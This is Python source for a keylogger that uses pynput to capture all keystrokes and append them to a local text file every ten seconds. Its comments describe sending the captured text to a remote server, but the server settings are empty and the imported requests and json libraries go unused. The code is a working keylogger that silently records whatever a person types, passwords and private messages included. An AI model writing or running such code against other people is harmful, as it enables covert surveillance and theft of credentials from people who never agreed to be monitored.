from pynput import keyboard
import threading
import time

# We need to import the requests library to Post the data to the server.
import requests

# To transform a Dictionary to a JSON string, we need the json package.
import json

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and IP address here.

# Time interval in seconds for code to execute.
time_interval = 10

# Function to write the captured keystrokes to the text file
def write_to_file():
    global text
    with open("keystyped.txt", "a") as file:
        file.write(text + "\n")
    # Clear the text variable after writing to the file
    text = ""
    # Schedule the function to be called again after the specified time interval
    threading.Timer(time_interval, write_to_file).start()

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press, we handle the way the key gets logged to the in-memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function, we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(on_press=on_press) as listener:
    # Start the timer to write the captured keystrokes to the file
    write_to_file()
    # Start the keyboard listener
    listener.join()
